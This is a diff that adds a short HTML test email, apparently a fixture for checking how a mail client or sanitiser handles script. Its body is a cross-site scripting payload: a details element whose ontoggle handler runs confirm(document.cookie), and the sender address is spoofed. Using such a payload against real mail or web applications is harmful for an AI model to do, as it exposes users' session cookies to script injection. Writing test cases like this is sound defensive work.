@@ -1,0 +1,10 @@
+From: frontierairlines@flyfrontier.com
+To: gerald.nemec@enron.com, chris.meyer@enron.com, paul.lucci@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<details ontoggle="confirm(document.cookie)">
+   xss
+   <summary>click me</summary>xssxssxss
+  </details>
